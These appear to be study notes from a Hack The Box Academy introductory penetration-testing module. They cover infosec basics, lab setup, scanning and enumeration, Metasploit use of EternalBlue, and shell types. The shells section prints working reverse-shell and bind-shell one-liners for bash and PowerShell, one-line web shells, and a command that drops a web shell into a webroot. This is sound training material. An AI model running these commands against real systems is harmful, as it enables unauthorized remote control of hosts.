---

mindmap-plugin: basic

---
## Infosec Overview
#### **1. Infosec Overview**

##### **1.1. Introduction**
- **Description:** Information security (infosec) is a rapidly evolving field with numerous specializations.
- **Specializations Include:**
  - Network and infrastructure security
  - Application security
  - Security testing
  - Systems auditing
  - Business continuity planning
  - Digital forensics
  - Incident detection and response
- **Purpose:** Infosec aims to protect data from unauthorized access, changes, unlawful use, disruption, etc., and to reduce the impact of security incidents.

##### **1.2. Data Protection**
- **Types of Data:** 
  - Electronic or physical
  - Tangible (e.g., design blueprints) or intangible (e.g., knowledge)
- **CIA Triad:** The core principle of infosec is protecting the "confidentiality, integrity, and availability" of data.

#### **2. Risk Management Process**

##### **2.1. Overview**
- **Objective:** The risk management process ensures that data protection is effective without hindering business operations.

##### **2.2. Steps in Risk Management Process**
- **Identifying the Risk:**
  - **Description:** Identifying risks such as legal, environmental, market, regulatory, and others.
- **Analyzing the Risk:**
  - **Description:** Determining the impact and probability of risks and mapping them to organizational policies, procedures, and business processes.
- **Evaluating the Risk:**
  - **Description:** Ranking and prioritizing risks, then deciding whether to accept, avoid, control, or transfer them.
- **Dealing with Risk:**
  - **Description:** Eliminating or containing risks by collaborating with stakeholders.
- **Monitoring Risk:**
  - **Description:** Constantly monitoring risks for situational changes that could alter their impact.

#### **3. Red Team vs. Blue Team**

##### **3.1. Overview**
- **Red Team:**
  - **Role:** Acts as the attackers, identifying weaknesses that real attackers might exploit.
  - **Tasks:** Penetration testing, social engineering, and other offensive techniques.
- **Blue Team:**
  - **Role:** Defenders, responsible for strengthening an organization's defenses.
  - **Tasks:** Analyzing risks, creating policies, responding to threats, and using security tools effectively.

#### **4. Role of Penetration Testers**

##### **4.1. Overview**
- **Description:** Security assessors help organizations identify risks in their networks, including vulnerabilities, misconfigurations, and sensitive data exposure.
- **Responsibilities:**
  - Identifying risks
  - Providing guidance on mitigating or remediating issues
  - Reproducing identified risks during testing

##### **4.2. Types of Assessments**
- **White-Box Penetration Test:** 
  - **Purpose:** To identify as many vulnerabilities as possible across all in-scope systems and applications.
- **Phishing Assessment:** 
  - **Purpose:** To assess the risk or employees' security awareness.
- **Targeted Red Team Assessment:** 
  - **Purpose:** To emulate a real-world threat actor in a specific scenario.

##### **4.3. Importance of Understanding the Bigger Picture**
- **Objective:** To accurately evaluate and rate vulnerabilities by understanding the risks an organization faces and its environment.

#### **5. Getting Started in Infosec and Penetration Testing**

##### **5.1. Overview**
- **Focus:** This module covers how to get started in infosec and penetration testing, specifically:
  - Selecting and navigating a pentest distro
  - Learning about common technologies and essential tools
  - Understanding the levels and basics of penetration testing
  - Cracking the first box on HTB
  - Finding and asking for help effectively
  - Addressing common potential issues
  - Navigating the Hack The Box platform


## Getting Started with a Pentest Distro
#### **1. Getting Started with a Pentest Distro**

##### **1.1. Overview**
- **Importance:** Anyone pursuing a technical path in information security must become proficient with various technologies and operating systems.
- **Requirement:** Penetration testers must be adept at setting up, maintaining, and securing both Linux and Windows attack machines.

##### **1.2. Client Environment Considerations**
- **Scenarios:** Depending on the client environment or scope, testing may be conducted using:
  - A Linux or Windows VM on the attacker's machine
  - The base operating system
  - A cloud-based Linux box
  - A VM installed within the client's environment
  - A client-owned workstation to simulate an insider threat

#### **2. Choosing a Distro**

##### **2.1. Overview**
- **Options:** Numerous Linux distributions (distros) are available for penetration testing.
- **Preloaded Distros:** Debian-based distros preloaded with many tools required for assessments.
- **Tool Customization:** No distro includes every tool needed; users often develop a list of "must-haves" as they progress in their careers.
- **Customization:** Advanced users may prefer to customize their own pentesting VM from a Debian or Ubuntu base image.

##### **2.2. Individual Preference**
- **Choice:** Selecting a distro is a personal choice, and users can even create and maintain their own from scratch.
- **Variety:** Linux distros are available for various purposes, including penetration testing, web application security, forensics, etc.

##### **2.3. Focus on Parrot OS**
- **Distro Used:** This section covers setting up and working with Parrot OS, used for the Pwnbox in the Academy.
- **Purpose:** The Pwnbox is customized for practice and solving exercises in various modules.

##### **2.4. Fresh VM Setup**
- **Importance:** Each penetration test or security assessment should be performed from a freshly installed VM.
- **Reason:** To avoid including security-relevant details from another client environment in reports or retaining client-sensitive data.
- **Requirement:** Ability to quickly set up a new pentest machine and implement processes (automation, scripts, procedures) for rapid setup of the distro(s) for each assessment.

#### **3. Setting Up a Pentest Distro**

##### **3.1. Setup Options**
- **Base Operating System:** Installing the distro as the base OS (not recommended).
- **Dual Boot:** Configuring the workstation to dual boot (time-consuming to switch between OSes).
- **Virtualization:** Installing using virtualization, which offers various options:
  - Hyper-V on Windows
  - Virtual machines on bare metal hypervisors such as Proxmox or VMware ESXi
  - Free hypervisors like VirtualBox or VMware Workstation Player

##### **3.2. Hypervisors**
- **Definition:** A hypervisor is software that allows the creation and running of virtual machines (VMs) by sharing memory and processing resources.
- **Isolation:** VMs run isolated from the primary OS, providing a layer of protection between the production network and vulnerable networks or client environments.
- **Resources:** The ability to run multiple VMs depends on the host system's resources (e.g., RAM).
- **Use Cases:** Setting up VMs during assessments to test exploits or recreate target applications and building machines in a lab environment for testing tools, exploits, and techniques.

##### **3.3. Home Lab Setup**
- **Purpose:** Setting up a home lab allows for reproducing vulnerabilities, testing remediation effects, and practicing new attack techniques/exploits.
- **Hardware:** The lab can be built on an old laptop, desktop, or preferably using a server with a bare-metal hypervisor.

#### **4. Parrot OS Setup**

##### **4.1. Parrot Security (Pwnbox)**
- **Format Options:**
  - **Optical Disc Image (ISO):**
    - **Description:** A CD-ROM image that can be mounted within a hypervisor to build the VM by installing the OS.
    - **Customization:** Allows for keyboard layout, locale, desktop environment switch, custom partitioning, etc.
  - **Open Virtual Appliance (OVA):**
    - **Description:** A pre-built virtual appliance that contains the VM hardware settings and the virtual disk with the OS.
    - **Deployment:** Rapidly deployable for quick setup.

##### **4.2. Getting Started**
- **Documentation:** The Parrot Linux team maintains helpful documentation on what Parrot is, installation, and configuration.
- **Forum:** A forum is available for additional questions.

#### **5. Practicing with Parrot**

##### **5.1. Parrot Linux in Academy**
- **Availability:** Parrot Linux is encountered throughout Academy via the in-browser Pwnbox.
- **Usage:** The Pwnbox can be used in any module sections requiring interaction with a target host in the lab environment.
- **Requirement:** Using the Pwnbox is optional; all Academy work can be completed within the browser without virtualization software or additional resources.

##### **5.2. Docker and VPN Access**
- **Docker:** Docker instances can be accessed without requiring a separate VPN connection.
- **VPN Key:** Specific hosts (e.g., Active Directory targets) require VPN access if not accessed from the Pwnbox, with a button available to download a VPN key after spawning the target.
## Staying Organized
#### **1. Staying Organized**

##### **1.1. Importance of Organization**
- **Overview:** Whether performing client assessments, playing CTFs, taking courses, or engaging in labs, organization is crucial. Clear and accurate documentation from the beginning is essential and beneficial across all information security paths.

#### **2. Folder Structure**

##### **2.1. Setting Up Folder Structure**
- **Purpose:** When attacking a single box, lab, or client environment, a clear folder structure is necessary to save various types of data.
- **Data Types:** Scoping information, enumeration data, evidence of exploitation attempts, sensitive data such as credentials, and other recon, exploitation, and post-exploitation data.
- **Example Structure:**

  ```
  Projects/
  └── Acme Company
      ├── EPT
      │   ├── evidence
      │   │   ├── credentials
      │   │   ├── data
      │   │   └── screenshots
      │   ├── logs
      │   ├── scans
      │   ├── scope
      │   └── tools
      └── IPT
          ├── evidence
          │   ├── credentials
          │   ├── data
          │   └── screenshots
          ├── logs
          ├── scans
          ├── scope
          └── tools
  ```

- **Customization:** Some professionals prefer creating folders for each target host, saving screenshots within them, while others organize notes by host or network and save screenshots directly in their note-taking tool. Experiment to find the best structure that works for you.

#### **3. Note Taking Tools**

##### **3.1. Importance of Note-Taking**
- **Overview:** Productivity and organization are vital. An unorganized penetration tester may struggle in the industry. Various tools can help with organization and note-taking.

##### **3.2. Tool Options**
- **Popular Tools:** 
  - **Cherrytree**
  - **Visual Studio Code**
  - **Evernote**
  - **Notion**
  - **GitBook**
  - **Sublime Text**
  - **Notepad++**

- **Tool Features:** Some tools are more focused on note-taking, while others like Notion and GitBook offer richer features for creating Wiki-type pages, cheat sheets, and more.
- **Client Data:** Ensure client data is stored locally and not synced to the cloud when using these tools for real-world assessments.
- **Tip:** Learning Markdown is beneficial for visually appealing and organized note-taking.

#### **4. Other Tools and Tips**

##### **4.1. Knowledge Base**
- **Importance:** Every infosec professional should maintain a knowledge base, which can be in the format of their choosing. The recommended tools above are ideal for this purpose.
- **Content:** Quick reference guides for setup tasks, cheat sheets for common commands used during assessments, and aggregated payloads, commands, and tips from completed boxes, labs, assessments, and training courses.

##### **4.2. Additional Resources**
- **Checklists:** Maintain checklists for different assessment types.
- **Report Templates:** Create report templates for various assessment types.
- **Findings/Vulnerability Database:** Build a database in the form of a spreadsheet or a more complex system. This should include a finding title, description, impact, remediation advice, and references. Pre-written findings save time during the reporting phase and require only minimal customization.

#### **5. Moving On**

##### **5.1. Practice Organization**
- **Recommendation:** Experiment with various note-taking tools and develop a folder structure that suits your methodology. Start organizing early to make it a habit.
- **Practice Opportunity:** The Nibbles walkthrough later in this module is an excellent opportunity to practice documentation. Additionally, this module contains many commands that are useful to add to a common commands cheat sheet.
## Common Terms
#### **1. Common Terms**

##### **1.1. Overview**
- **Context:** Penetration testing and hacking is an enormous field that involves numerous technologies. Understanding common terms and technologies is crucial for anyone in the field.

#### **2. What is a Shell?**

##### **2.1. Definition**
- **Shell:** A program that takes input from the user via the keyboard and passes commands to the operating system to perform specific functions. It was the original interface for interacting with systems.

##### **2.2. Types of Shells**
- **Bash (Bourne Again Shell):** The most common shell program on Linux systems, an enhanced version of the original Unix shell program, sh.
- **Other Shells:** Zsh, Tcsh, Ksh, Fish shell, etc.

##### **2.3. Shell Access**
- **"Getting a Shell":** Refers to obtaining shell-level access on a target host, typically through exploiting a vulnerability or obtaining credentials.

##### **2.4. Types of Shell Connections**
- **Reverse Shell:** Initiates a connection back to a "listener" on the attack box.
- **Bind Shell:** Binds to a specific port on the target host and waits for a connection from the attack box.
- **Web Shell:** Runs operating system commands via the web browser, typically not interactive or semi-interactive, used for single command execution.

#### **3. What is a Port?**

##### **3.1. Definition**
- **Port:** Virtual points where network connections begin and end, managed by the host operating system. Ports allow computers to differentiate between different types of traffic.

##### **3.2. Types of Ports**
- **TCP (Transmission Control Protocol):** Connection-oriented, requires a connection between client and server before data is sent.
- **UDP (User Datagram Protocol):** Connectionless, no handshake, used for time-sensitive tasks where speed is prioritized over reliability.

##### **3.3. Common Ports**
- **Port 20/21 (TCP):** FTP
- **Port 22 (TCP):** SSH
- **Port 23 (TCP):** Telnet
- **Port 25 (TCP):** SMTP
- **Port 80 (TCP):** HTTP
- **Port 161 (TCP/UDP):** SNMP
- **Port 389 (TCP/UDP):** LDAP
- **Port 443 (TCP):** SSL/TLS (HTTPS)
- **Port 445 (TCP):** SMB
- **Port 3389 (TCP):** RDP

##### **3.4. Importance**
- **Recall:** As security professionals, quickly recalling TCP and UDP ports by number is essential for efficient work and prioritizing enumeration and attacks.

#### **4. What is a Web Server?**

##### **4.1. Definition**
- **Web Server:** An application running on the back-end server that handles HTTP traffic, connects end-users to various parts of the web application, and handles responses.

##### **4.2. Vulnerabilities**
- **Public Interaction:** Web servers are often open for public interaction, leading to potential compromises if they have vulnerabilities.
- **Attack Surface:** Web applications can provide a vast attack surface, making them high-value targets.

##### **4.3. OWASP Top 10**
- **Category 1: Broken Access Control:** Improper restrictions allowing unauthorized access to data or functions.
- **Category 2: Cryptographic Failures:** Failures in cryptography leading to sensitive data exposure.
- **Category 3: Injection:** User-supplied data is not validated, leading to injection attacks like SQL injection.
- **Category 4: Insecure Design:** Issues arising from a lack of security consideration in the design phase.
- **Category 5: Security Misconfiguration:** Insecure configurations across the application stack.
- **Category 6: Vulnerable and Outdated Components:** Use of outdated or unsupported components.
- **Category 7: Identification and Authentication Failures:** Attacks targeting identity and authentication mechanisms.
- **Category 8: Software and Data Integrity Failures:** Code and infrastructure failing to protect against integrity violations.
- **Category 9: Security Logging and Monitoring Failures:** Inadequate logging and monitoring, hindering breach detection and response.
- **Category 10: Server-Side Request Forgery (SSRF):** Vulnerabilities allowing attackers to send crafted requests to unexpected destinations.

##### **4.4. Importance**
- **Familiarity:** Understanding these categories and vulnerabilities is crucial as web application vulnerabilities are a significant focus area in security assessments.
## Basic Tools
#### **1. Basic Tools**

##### **1.1. Using SSH**
- **Purpose:** Provides a secure way to access a computer remotely, typically running on port 22. 
- **Usage:** SSH can be configured with password authentication or passwordless using public-key authentication. It is used to access systems remotely, facilitate connections to resources using port forwarding/proxying, and upload/download files.
- **Command Example:** `ssh Bob@10.10.10.10`

##### **1.2. Using Netcat**
- **Purpose:** A network utility for interacting with TCP/UDP ports, often used for connecting to shells, banner grabbing, and transferring files.
- **Command Example:** `netcat 10.10.10.10 22`

##### **1.3. Using Tmux**
- **Purpose:** A terminal multiplexer that allows multiple windows within one terminal session and the ability to jump between them.
- **Usage:** Tmux can create multiple windows, split panes, and navigate between them using keyboard shortcuts.
- **Command Example:** `sudo apt install tmux -y`

##### **1.4. Using Vim**
- **Purpose:** A text editor for writing and editing code or text files on Linux systems.
- **Usage:** Vim relies entirely on the keyboard, increasing productivity and efficiency. It is commonly used for editing files on compromised Linux systems.
- **Command Example:** `vim /etc/hosts`


## Service Scanning
#### **1. Service Scanning**

##### **1.1. Overview**
- **Purpose:** The goal is to identify the operating system and any available services running on a target machine. Services are applications performing specific functions for users or other computers, and they may be vulnerable or misconfigured, allowing for potential exploitation.
- **Context:** Services are accessible via IP addresses and port numbers. Ports range from 1 to 65,535, with well-known ports ranging from 1 to 1,023. Tools like Nmap automate the process of scanning these ports to identify available services.

##### **1.2. Nmap**
- **Purpose:** Nmap (Network Mapper) is a widely used tool for scanning networks to identify open ports and services. By default, it scans the 1,000 most common ports.
- **Basic Scan Example:**  
  - **Command:** `nmap 10.129.42.253`
  - **Output:**  
    ```
    PORT    STATE SERVICE
    21/tcp  open  ftp
    22/tcp  open  ssh
    80/tcp  open  http
    139/tcp open  netbios-ssn
    445/tcp open  microsoft-ds
    ```

##### **1.3. Advanced Nmap Scan**
- **Purpose:** To gather more detailed information about the target device, including service versions and OS details.
- **Command Example:**  
  - **Command:** `nmap -sV -sC -p- 10.129.42.253`
  - **Output:**  
    ```
    PORT    STATE SERVICE     VERSION
    21/tcp  open  ftp         vsftpd 3.0.3
    22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
    ```

##### **1.4. Nmap Scripts**
- **Purpose:** To enhance scanning functionality by using specific Nmap scripts, such as auditing a Citrix installation.
- **Example Scripts:**  
  - **Command:** `nmap --script citrix-enum-apps.nse -p<port> <host>`

#### **2. Attacking Network Services**

##### **2.1. Banner Grabbing**
- **Purpose:** Banner grabbing is a technique to quickly identify a service by its banner, which can reveal service versions and other details.
- **Manual Banner Grabbing:**  
  - **Command Example:** `nc -nv 10.129.42.253 21`
  - **Output:**  
    ```
    (UNKNOWN) [10.129.42.253] 21 (ftp) open
    220 (vsFTPd 3.0.3)
    ```

##### **2.2. FTP**
- **Purpose:** FTP is a standard protocol often found running on port 21 and can contain interesting data.
- **Command Example:**  
  - **Nmap Command:** `nmap -sC -sV -p21 10.129.42.253`
  - **Output:**  
    ```
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.10.14.2
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 3
    |      vsFTPd 3.0.3 - secure, fast, stable
    |   End of status
    ```

- **Connecting to FTP:**  
  - **Command Example:** `ftp -p 10.129.42.253`
  - **Output:**  
    ```
    Connected to 10.129.42.253.
    220 (vsFTPd 3.0.3)
    Name (10.129.42.253:user): anonymous
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.

    ftp> ls
    227 Entering Passive Mode (10,129,42,253,158,60).
    150 Here comes the directory listing.
    drwxr-xr-x    2 ftp      ftp          4096 Feb 25 19:25 pub
    226 Directory send OK.
    ```

##### **2.3. SMB**
- **Purpose:** SMB (Server Message Block) is a prevalent protocol on Windows machines that provides many vectors for lateral movement and can contain sensitive data.
- **Enumerating SMB with Nmap:**  
  - **Command Example:** `nmap --script smb-os-discovery.nse -p445 10.10.10.40`
  - **Output:**  
    ```
    PORT    STATE SERVICE
    445/tcp open  microsoft-ds

    Host script results:
    | smb-os-discovery: 
    |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
    |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
    |   Computer name: CEO-PC
    |   NetBIOS computer name: CEO-PC\x00
    |   Workgroup: WORKGROUP\x00
    |   System time: 2020-12-27T00:59:46+00:00
    ```

- **Connecting to SMB Shares:**  
  - **Command Example:** `smbclient -N -L \\\\10.129.42.253`
  - **Output:**  
    ```
    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    users           Disk      
    IPC$            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))
    ```

##### **2.4. SNMP**
- **Purpose:** SNMP (Simple Network Management Protocol) provides information about network devices. Versions 1 and 2c use community strings for access control, often defaulting to "public" and "private".
- **Command Example:**  
  - **Command:** `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`
  - **Output:**  
    ```
    iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"
    ``` 

- **Brute Forcing SNMP Community Strings:**  
  - **Command Example:** `onesixtyone -c dict.txt 10.129.42.254`
  - **Output:**  
    ```
    Scanning 1 hosts, 51 communities
    10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic #74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64
    ```
## Web Enumeration
#### **1. Web Enumeration**

##### **1.1. Overview**
- **Purpose:** When performing service scanning, web servers often appear on ports 80 and 443. These web servers host web applications that provide a considerable attack surface and are high-value targets during penetration testing. Proper web enumeration is essential, especially when services are limited or well-patched.

#### **2. Directory/File Enumeration**

##### **2.1. Gobuster**
- **Purpose:** After discovering a web application, it is essential to check for hidden files or directories on the webserver. Tools like GoBuster and ffuf can perform directory enumeration to uncover hidden functionalities or sensitive data that may be leveraged for further exploitation.
- **Command Example:**  
  - **Command:** `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`
  - **Output:**  
    ```
    /index.php (Status: 200)
    /wordpress (Status: 301)
    ```

#### **3. DNS Subdomain Enumeration**

##### **3.1. Overview**
- **Purpose:** Important resources might be hosted on subdomains, such as admin panels or applications with additional functionalities. Enumerating these subdomains can uncover additional attack vectors.
- **Command Example:**  
  - **Command:** `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt`
  - **Output:**  
    ```
    Found: blog.inlanefreight.com
    Found: customer.inlanefreight.com
    ```

#### **4. Web Enumeration Tips**

##### **4.1. Banner Grabbing / Web Server Headers**
- **Purpose:** Web server headers can reveal essential information about the hosted applications, including the framework, authentication options, and security configurations.
- **Command Example:**  
  - **Command:** `curl -IL https://www.inlanefreight.com`
  - **Output:**  
    ```
    Server: Apache/2.4.29 (Ubuntu)
    Content-Type: text/html; charset=UTF-8
    ```

##### **4.2. Whatweb**
- **Purpose:** Whatweb is a command-line tool used to extract version information from web servers, supporting frameworks, and applications. This helps in pinpointing technologies in use and identifying potential vulnerabilities.
- **Command Example:**  
  - **Command:** `whatweb 10.10.10.121`
  - **Output:**  
    ```
    Apache[2.4.41], PHP[7.4.3 - phpinfo()]
    ```

##### **4.3. Certificates**
- **Purpose:** SSL/TLS certificates, when used with HTTPS, can provide valuable information such as email addresses and company names, potentially useful in phishing attacks.
- **Context:** Browsing to a secure website and viewing the certificate details can reveal useful information that can be leveraged in an assessment.

##### **4.4. Robots.txt**
- **Purpose:** The robots.txt file provides instructions to search engine crawlers on which resources to index or ignore. It can also reveal private files and admin pages that should not be public.
- **Example:** Navigating to a found URL in the robots.txt file may reveal sensitive login pages or other restricted areas.

##### **4.5. Source Code**
- **Purpose:** Reviewing the source code of web pages can uncover developer comments, credentials, or other useful information that may be used for further exploitation.
- **Tip:** Use [CTRL + U] in a browser to bring up the source code window and search for any revealing information.


## Public Exploits
#### **1. Public Exploits**

##### **1.1. Overview**
- **Purpose:** After identifying the services running on ports from an Nmap scan, the next step is to search for any public exploits related to these applications or services. Public exploits can be relevant for web applications and other services like SSH or FTP.

##### **1.2. Finding Public Exploits**
- **Purpose:** Several tools can assist in searching for public exploits for the applications and services encountered during enumeration. One common method is to Google the application name followed by "exploit." A well-known tool for this is searchsploit, which can search for public vulnerabilities/exploits for any application.
- **Command Example:**  
  - **Command:** `searchsploit openssh 7.2`
  - **Output:**  
    ```
    OpenSSH 2.3 < 7.7 - Username Enumeration | linux/remote/45233.py
    OpenSSH 7.2p1 - (Authenticated) xauth Command Injection | multiple/remote/39569.py
    ```

##### **1.3. Online Exploit Databases**
- **Purpose:** Utilize online exploit databases like Exploit DB, Rapid7 DB, or Vulnerability Lab to search for vulnerabilities. These databases are valuable resources for finding public vulnerabilities, especially for web applications.

#### **2. Metasploit Primer**

##### **2.1. Overview**
- **Purpose:** The Metasploit Framework (MSF) is a powerful tool for penetration testers, containing many built-in exploits for public vulnerabilities. It offers features for running reconnaissance scripts, verifying vulnerabilities, and post-exploitation activities.

##### **2.2. Running Metasploit**
- **Command Example:**  
  - **Command:** `msfconsole`
  - **Output:**  
    ```
    =[ metasploit v6.0.16-dev                          ]
    + -- --=[ 2074 exploits - 1124 auxiliary - 352 post       ]
    + -- --=[ 592 payloads - 45 encoders - 10 nops            ]
    + -- --=[ 7 evasion                                       ]
    ```

##### **2.3. Searching for Exploits**
- **Purpose:** Metasploit allows searching for specific exploits related to identified vulnerabilities. For example, searching for the SMB vulnerability "EternalBlue."
- **Command Example:**  
  - **Command:** `search exploit eternalblue`
  - **Output:**  
    ```
    4  exploit/windows/smb/ms17_010_psexec  | MS17-010 SMB Remote Windows Kernel Pool Corruption
    ```

##### **2.4. Using an Exploit**
- **Purpose:** Once an exploit is found, it can be used within Metasploit by setting the required options like RHOSTS (target IP) and LHOST (attacker IP).
- **Command Example:**  
  - **Command:** `use exploit/windows/smb/ms17_010_psexec`
  - **Command:** `set RHOSTS 10.10.10.40`
  - **Command:** `set LHOST tun0`
  - **Command:** `exploit`

##### **2.5. Running a Vulnerability Check**
- **Purpose:** Before exploiting, it is possible to check if the target is vulnerable using the `check` command.
- **Command Example:**  
  - **Command:** `check`
  - **Output:**  
    ```
    [+] 10.10.10.40:445 - The target is vulnerable.
    ```

##### **2.6. Exploiting the Target**
- **Purpose:** Once confirmed that the target is vulnerable, the `exploit` command is used to gain access.
- **Command Example:**  
  - **Command:** `exploit`
  - **Output:**  
    ```
    Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159)
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
    ```

##### **2.7. Practicing with Metasploit**
- **Context:** There are many retired boxes on the Hack The Box platform that are great for practicing with Metasploit, such as Granny, Grandpa, Jerry, Blue, Lame, Optimum, Legacy, and Devel.


## Types of Shells
#### **1. Types of Shells**

##### **1.1. Overview**
- **Purpose:** After compromising a system and exploiting a vulnerability, we often need a method to communicate with the system without repeatedly exploiting the same vulnerability to execute each command. This allows us to take control of the system or further investigate it within its network.
- **Context:** Shells provide a means of accessing a compromised host for control and remote code execution.

##### **1.2. Types of Shells**
- **Reverse Shell:** Connects back to our system and gives us control through a reverse connection.
- **Bind Shell:** Waits for us to connect to it and gives us control once we do.
- **Web Shell:** Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.

#### **2. Reverse Shell**

##### **2.1. Overview**
- **Purpose:** A Reverse Shell is the most common type of shell, allowing quick and easy control over a compromised host by connecting the remote system's shell to our listener.
  
##### **2.2. Netcat Listener**
- **Purpose:** Start a Netcat listener on a chosen port to wait for a reverse connection.
- **Command Example:**  
  - **Command:** `nc -lvnp 1234`
  - **Flags:**
    - `-l`: Listen mode.
    - `-v`: Verbose mode.
    - `-n`: Disable DNS resolution.
    - `-p 1234`: Port number.

##### **2.3. Connect Back IP**
- **Purpose:** Determine our system's IP to send a reverse connection back.
- **Command Example:**  
  - **Command:** `ip a`
  - **Example Output:** `inet 10.10.10.10/23 scope global tun0`

##### **2.4. Reverse Shell Command**
- **Purpose:** Execute a reverse shell command depending on the OS of the compromised host to get a reverse connection.
- **Example Commands:**
  - **Bash on Linux:** `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`
  - **PowerShell on Windows:** `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"`

##### **2.5. Netcat Listener Output**
- **Purpose:** Verify that a reverse connection has been established.
- **Command Example:**  
  - **Command:** `nc -lvnp 1234`
  - **Example Output:**  
    ```
    connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572
    id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```

#### **3. Bind Shell**

##### **3.1. Overview**
- **Purpose:** A Bind Shell allows us to connect to a target's listening port, giving us control over the remote system's shell.

##### **3.2. Bind Shell Command**
- **Purpose:** Execute a bind shell command on the remote host to start listening on a specific port.
- **Example Commands:**
  - **Bash on Linux:** `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f`
  - **PowerShell on Windows:** `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();`

##### **3.3. Netcat Connection**
- **Purpose:** Connect to the listening port of the bind shell to gain control.
- **Command Example:**  
  - **Command:** `nc 10.10.10.1 1234`
  - **Example Output:**      id uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```
    id

    ```

##### **3.4. Upgrading TTY**
- **Purpose:** Upgrade the shell to a full TTY to allow more advanced command interaction.
- **Command Example:**  
  - **Command:** `python -c 'import pty; pty.spawn("/bin/bash")'`
  - **Command:** `stty raw -echo`
  - **Command:** `fg`
  - **Command:** `export TERM=xterm-256color`
  - **Command:** `stty rows 67 columns 318`

#### **4. Web Shell**

##### **4.1. Overview**
- **Purpose:** A Web Shell is a web script that accepts commands through HTTP request parameters, executes them, and prints the output back on a web page.

##### **4.2. Writing a Web Shell**
- **Purpose:** Create a web shell script to accept and execute commands.
- **Example Commands:**
  - **PHP:** `<?php system($_REQUEST["cmd"]); ?>`
  - **JSP:** `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
  - **ASP:** `<% eval request("cmd") %>`

##### **4.3. Uploading a Web Shell**
- **Purpose:** Upload the web shell script to the webroot of the compromised host.
- **Default Webroots:**
  - **Apache:** `/var/www/html/`
  - **Nginx:** `/usr/local/nginx/html/`
  - **IIS:** `c:\inetpub\wwwroot\`
  - **XAMPP:** `C:\xampp\htdocs\`
- **Command Example:**  
  - **Command:** `echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php`

##### **4.4. Accessing the Web Shell**
- **Purpose:** Access the web shell through a browser or cURL and execute commands.
- **Command Example:**  
  - **Browser:** `http://SERVER_IP:PORT/shell.php?cmd=id`
  - **cURL:**  
    - **Command:** `curl http://SERVER_IP:PORT/shell.php?cmd=id`
    - **Example Output:**        uid=33(www-data) gid=33(www-data) groups=33(www-data)
      ```

      ```
## Privilege Escalation
#### **1. Privilege Escalation**

##### **1.1. Overview**
- **Purpose:** After gaining initial access to a remote server, privilege escalation allows us to elevate our privileges from a low-privileged user to a root or administrator user, granting full control over the system.
- **Context:** We need to find internal/local vulnerabilities to escalate privileges to gain complete access over a compromised system.

#### **2. PrivEsc Checklists**

##### **2.1. Overview**
- **Purpose:** Privilege escalation checklists and cheat sheets provide a collection of checks to run on a compromised system, along with commands to identify potential vulnerabilities.
- **Common Resources:** HackTricks, PayloadsAllTheThings.

#### **3. Enumeration Scripts**

##### **3.1. Overview**
- **Purpose:** Scripts automate the enumeration process by running common commands to identify vulnerabilities.
- **Common Linux Scripts:** LinEnum, linuxprivchecker, LinPEAS.
- **Common Windows Scripts:** Seatbelt, JAWS.
- **Note:** These scripts may trigger security monitoring software and should be used cautiously in production environments.

##### **3.2. Running LinPEAS**
- **Command Example:**  
  - **Command:** `./linpeas.sh`

#### **4. Kernel Exploits**

##### **4.1. Overview**
- **Purpose:** Kernel exploits target vulnerabilities in older, unpatched operating systems to escalate privileges.
- **Example Vulnerability:** DirtyCow (CVE-2016-5195) for Linux kernel version 3.9.0-73-generic.

#### **5. Vulnerable Software**

##### **5.1. Overview**
- **Purpose:** Look for installed software on Linux (using `dpkg -l`) or Windows (searching `C:\Program Files`) to identify vulnerabilities in older or unpatched software.

#### **6. User Privileges**

